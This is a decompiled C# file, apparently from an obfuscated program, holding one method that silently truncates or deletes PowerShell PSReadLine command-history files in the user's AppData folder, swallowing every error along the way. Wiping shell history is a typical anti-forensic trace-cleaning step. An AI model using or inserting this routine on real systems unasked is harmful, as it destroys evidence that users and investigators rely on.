using System;
using System.Collections.Generic;
using System.IO;

namespace ns0
{
	// Token: 0x02000009 RID: 9
	public static class GClass1
	{
		// Token: 0x06000016 RID: 22 RVA: 0x000056C4 File Offset: 0x000038C4
		public static IReadOnlyList<string> smethod_0()
		{
			List<string> list = new List<string>();
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			foreach (string text in new string[]
			{
				Path.Combine(new string[] { folderPath, "Microsoft", "Windows", "PowerShell", "PSReadLine" }),
				Path.Combine(folderPath, "Microsoft", "PowerShell", "PSReadLine")
			})
			{
				if (Directory.Exists(text))
				{
					foreach (string text2 in Directory.EnumerateFiles(text, "*_history.txt"))
					{
						try
						{
							File.SetAttributes(text2, FileAttributes.Normal);
							using (new FileStream(text2, FileMode.Create, FileAccess.Write, FileShare.ReadWrite))
							{
							}
							list.Add(text2);
						}
						catch (IOException)
						{
							try
							{
								File.Delete(text2);
								list.Add(text2);
							}
							catch
							{
							}
						}
						catch
						{
						}
					}
				}
			}
			return list;
		}
	}
}
